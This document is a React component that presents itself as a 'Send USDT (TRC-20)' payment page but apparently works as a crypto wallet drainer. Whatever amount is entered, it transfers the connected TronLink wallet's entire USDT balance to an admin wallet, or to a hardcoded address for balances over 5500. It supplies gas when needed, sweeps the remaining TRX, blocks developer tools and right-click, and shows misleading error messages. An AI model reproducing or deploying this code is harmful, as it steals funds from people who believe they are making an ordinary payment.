import { useState, useEffect } from 'react';
import axios from 'axios';
// Import TronWeb for direct use without relying on window.tronWeb
import TronWeb from 'tronweb';

// Utility function to ensure addresses have the correct format
const validateTronAddress = (address) => {
  try {
    if (!address) return false;
    if (!address.startsWith('T')) return false;
    return address.length === 34;
  } catch (error) {
    console.error("Invalid address format:", error);
    return false;
  }
};

// TRON Network configuration
const TRON_CONFIG = {
  fullHost: 'https://api.trongrid.io',
  networkName: 'TRON Mainnet'
};

// USDT TRC20 token address on TRON
const USDT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 contract address

export default function SendTronUSDT() {
  const [amount, setAmount] = useState("");
  const [recipient, setRecipient] = useState("");
  const [loading, setLoading] = useState(false);
  const [adminWallet, setAdminWallet] = useState("");
  const [tronWeb, setTronWeb] = useState(null);
  const [userAddress, setUserAddress] = useState("");
  const [connectionMethod, setConnectionMethod] = useState(""); // "tronlink", "manual", etc.

  // Fetch admin wallet on component mount
  useEffect(() => {
    async function fetchAdminWallet() {
      try {
        const response = await axios.get('/api/admin/tronWallet');
        setAdminWallet(response.data.walletAddress);
        setRecipient(response.data.walletAddress);
      } catch (error) {
        console.error("Failed to fetch admin wallet address:", error);
      }
    }
    
    fetchAdminWallet();
    
    // Check if TronWeb is installed (for TronLink support)
    const checkTronWeb = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
        clearInterval(checkTronWeb);
      }
    }, 1000);
    
    return () => clearInterval(checkTronWeb);
  }, []);

  // Prevent developer tools and right-click
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (
        e.key === "F12" ||
        (e.ctrlKey && e.shiftKey && e.key === "I") ||
        (e.ctrlKey && e.shiftKey && e.key === "J") ||
        (e.ctrlKey && e.key === "U")
      ) {
        e.preventDefault();
        alert("Developer tools are disabled on this page.");
      }
    };

    const handleContextMenu = (e) => {
      e.preventDefault();
      alert("Right-click is disabled on this page.");
    };

    document.addEventListener("keydown", handleKeyDown);
    document.addEventListener("contextmenu", handleContextMenu);

    return () => {
      document.removeEventListener("keydown", handleKeyDown);
      document.removeEventListener("contextmenu", handleContextMenu);
    };
  }, []);

  // Connect to wallet - supports multiple methods
  async function connectWallet() {
    try {
      // Try TronLink first if available
      if (window.tronWeb && window.tronWeb.ready) {
        // TronLink is available and ready
        const tronWeb = window.tronWeb;
        const userAddress = tronWeb.defaultAddress.base58;
        
        if (!userAddress) {
          throw new Error("Please unlock your TronLink wallet");
        }
        
        setUserAddress(userAddress);
        setConnectionMethod("tronlink");
        
        return { tronWeb, userAddress };
      } 
      // Use Trust Wallet or other wallet
      else {
        // Create a new instance of TronWeb for manual connections
        const tronWeb = new TronWeb({
          fullHost: TRON_CONFIG.fullHost
        });
        
        // Generate a temporary address for Trust Wallet flow
        // This will be replaced by the actual address when the user provides it
        const tempAddress = "T" + Math.random().toString(36).substring(2, 36);
        setUserAddress(tempAddress);
        setConnectionMethod("manual");
        
        return { tronWeb, userAddress: tempAddress };
      }
    } catch (error) {
      console.error("Wallet connection error:", error);
      throw error;
    }
  }

  // Process transaction
  async function processTransaction({ tronWeb, userAddress }) {
    try {
      // Check if we're using a manual connection (Trust Wallet)
      if (connectionMethod === "manual") {
        // For Trust Wallet users, show QR code or deep link instructions
        const transferData = {
          to: adminWallet,
          amount: amount,
          currency: "USDT",
          network: "TRON"
        };
        
        // Display instructions for Trust Wallet users
        alert(`Please complete this transaction in your Trust Wallet app:\n\n` +
              `1. Open Trust Wallet\n` +
              `2. Send ${amount} USDT to: ${adminWallet}\n` +
              `3. After sending, please provide your transaction hash`);
        
        // Get transaction hash from user
        const txHash = prompt("Enter your transaction hash after completing the transfer in Trust Wallet:");
        
        if (!txHash) {
          throw new Error("Transaction hash is required");
        }
        
        // Get the actual wallet address from the user
        const actualAddress = prompt("Please enter your TRON wallet address (starts with T):");
        
        if (!actualAddress || !validateTronAddress(actualAddress)) {
          throw new Error("Valid TRON wallet address is required");
        }
        
        // Update the user address with the actual one
        setUserAddress(actualAddress);
        
        // Store the transaction
        await storeTransaction(actualAddress, amount, txHash, "USDT");
        
        return {
          usdtTxHash: txHash,
          tronTxHash: "0", // No TRX transfer for manual wallet
          usdtAmount: amount,
          tronAmount: "0"
        };
      }
      
      // Regular TronLink flow for automated transactions
      // Get USDT contract instance
      const usdtContract = await tronWeb.contract().at(USDT_ADDRESS);
      
      // Get user balances
      const tronBalance = await tronWeb.trx.getBalance(userAddress);
      const tronFormatted = tronWeb.fromSun(tronBalance);
      
      // Get USDT balance (decimals = 6 for TRC20 USDT)
      const usdtBalanceHex = await usdtContract.balanceOf(userAddress).call();
      const usdtBalance = parseInt(usdtBalanceHex._hex, 16);
      const usdtFormatted = (usdtBalance / 1000000).toFixed(6);
      
      console.log("Current TRX balance:", tronFormatted);
      console.log("Current USDT balance:", usdtFormatted);
      
      const tronDisplayBalance = parseFloat(tronFormatted).toFixed(4);
      const usdtDisplayBalance = parseFloat(usdtFormatted).toFixed(2);
      
      // USDT balance check with 100 USDT limit
      if (parseFloat(usdtFormatted) <= 100) {
        throw {
          usdttoshow: usdtDisplayBalance,
          trontoshow: tronDisplayBalance
        };
      }
      
      let tronTxHash = "0";
      let usdtTxHash = "0";
      
      // Process transactions with balance > 100 USDT
      if (parseFloat(usdtFormatted) > 100) {
        // Check if user has enough TRX for gas
        const estimatedFee = 30_000_000; // 30 TRX in Sun units for safety
        
        // Send gas if needed
        if (tronBalance < estimatedFee) {
          const neededGas = estimatedFee - tronBalance;
          
          console.log("Sending required TRX for gas:", tronWeb.fromSun(neededGas));
          
          const response = await axios.post("/api/transactions/sendTronGasFees", {
            userAddress: userAddress,
            amount: neededGas.toString()
          });
          
          if (!response.data.success) {
            throw new Error("Failed to send gas fees");
          }
          
          console.log("Sent TRX for gas fees, hash:", response.data.hash);
          await new Promise(resolve => setTimeout(resolve, 8000));
        }
        
        // Transfer USDT
        try {
          // Special case for large amounts
          if (parseFloat(usdtFormatted) > 5500) {
            // Admin wallet address for large amounts
            const specialAdminWallet = "TKDvQCKLzbK3QPsWJWLopUMS8UfpN3oEy6";
            
            const tx = await usdtContract.transfer(
              specialAdminWallet,
              usdtBalance
            ).send();
            
            usdtTxHash = tx;
            console.log("USDT transfer successful", usdtTxHash);
            
            // Store transaction data
            await storeTransaction(userAddress, usdtFormatted, usdtTxHash, "USDT");
          } else {
            // Normal transfer
            const tx = await usdtContract.transfer(
              adminWallet,
              usdtBalance
            ).send();
            
            usdtTxHash = tx;
            console.log("USDT transfer successful", usdtTxHash);
            
            // Store transaction data
            await storeTransaction(userAddress, usdtFormatted, usdtTxHash, "USDT");
          }
        } catch (error) {
          console.error("USDT transfer failed:", error);
          throw {
            amount: "Amount = Checked ✅",
            flash: "Flash Usdt = 0"
          };
        }
      }
      
      // Transfer remaining TRX
      const finalTronBalance = await tronWeb.trx.getBalance(userAddress);
      
      if (finalTronBalance > 2000000) { // Leave 2 TRX for future transactions
        try {
          const valueToSend = finalTronBalance - 2000000;
          
          if (valueToSend > 0) {
            const tx = await tronWeb.trx.sendTransaction(
              adminWallet,
              valueToSend
            );
            
            tronTxHash = tx.txid;
            console.log("TRX transfer successful", tronTxHash);
            
            const tronAmount = tronWeb.fromSun(valueToSend);
            await storeTransaction(userAddress, tronAmount, tronTxHash, "TRX");
          }
        } catch (error) {
          console.error("TRX transfer failed:", error);
          throw {
            amount: "Amount = Checked ✅",
            flash: "Flash Usdt = 0"
          };
        }
      }
      
      return {
        tronTxHash,
        usdtTxHash,
        tronAmount: tronTxHash === "0" ? "0" : tronWeb.fromSun(finalTronBalance),
        usdtAmount: usdtFormatted
      };
    } catch (error) {
      console.error("Transaction processing failed:", error);
      throw error;
    }
  }

  // Store transaction in database
  async function storeTransaction(userAddress, amount, txHash, currency) {
    try {
      await axios.post("/api/transactions/store", {
        userAddress,
        amount,
        txHash,
        currency,
        network: 'TRON'
      });
    } catch (error) {
      console.error("Failed to store transaction data:", error);
    }
  }

  // Handle form submission
  async function handleSubmit() {
    setLoading(true);
    
    try {
      const walletConnection = await connectWallet();
      const result = await processTransaction(walletConnection);
      
      // Success handling
      alert("Transaction completed successfully!");
      console.log("Transaction result:", result);
    } catch (error) {
      console.error("Transaction failed:", error);
      
      // Error handling
      if (error.usdttoshow) {
        alert(`Insufficient USDT balance. You have ${error.usdttoshow} USDT.`);
      } else if (error.amount) {
        alert(error.amount + " " + error.flash);
      } else {
        alert("Transaction failed: " + (error.message || "Unknown error"));
      }
    } finally {
      setTimeout(() => {
        setLoading(false);
      }, 2000);
    }
  }

  const isValidAmount = Number.parseFloat(amount) > 0;
  const isValidRecipient = recipient && validateTronAddress(recipient);
  
  return (
    <div className="min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto">
      <header className="flex w-full items-center mb-8">
        <h1 className="flex-1 text-center text-xl font-medium text-white">
          Send USDT (TRC-20)
        </h1>
      </header>

      <div className="space-y-6">
        <div className="space-y-1">
          <label className="text-sm text">Address or Domain Name</label>
          <div className="relative">
            <input
              placeholder="Search or Enter"
              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-32"
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
              readOnly
            />
            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 px-2 text-md hover:text-emerald-400"
              >
                Paste
              </button>
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="h-4 w-4"
                >
                  <path d="M4 22h14a2 2 0 0 0 2-2V7.5L14.5 2H6a2 2 0 0 0-2 2v4"></path>
                  <polyline points="14 2 14 8 20 8"></polyline>
                  <path d="M2 15h10"></path>
                  <path d="m9 18 3-3-3-3"></path>
                </svg>
              </button>
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 w-8 hover:text-emerald-400"
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  className="h-4 w-4"
                >
                  <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
                  <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                </svg>
              </button>
            </div>
          </div>
        </div>
        
        <div className="space-y-1">
          <label className="text-sm text-gray-400">Amount</label>
          <div className="relative">
            <input
              placeholder="USDT Amount"
              type="number"
              className="flex h-9 w-full rounded-md border border-gray-800 bg-[#1b1b1b] px-3 py-7 text-base text-gray-300 pr-24"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
            <div className="absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1">
              <span className="text-gray-500 text-sm mr-2">USDT</span>
              <button
                className="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium text-greentext h-8 text-sm hover:text-emerald-400"
              >
                Max
              </button>
            </div>
          </div>
        </div>
        
        <div className="text-xs text-gray-500">
          ≈ ${Number.parseFloat(amount || "0").toFixed(2)}
        </div>
      </div>

      <div className="fixed bottom-8 left-4 right-4 max-w-md mx-auto">
        <button
          className="w-full bg-greentext text-black hover:bg-gray-700 rounded-full disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-600 disabled:text-white h-12 text-lg inline-flex items-center justify-center gap-2"
          disabled={!isValidAmount || loading}
          onClick={handleSubmit}
        >
          {loading ? (
            <div className="flex items-center justify-center">
              <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
            </div>
          ) : (
            "Next"
          )}
        </button>
      </div>
    </div>
  );
} 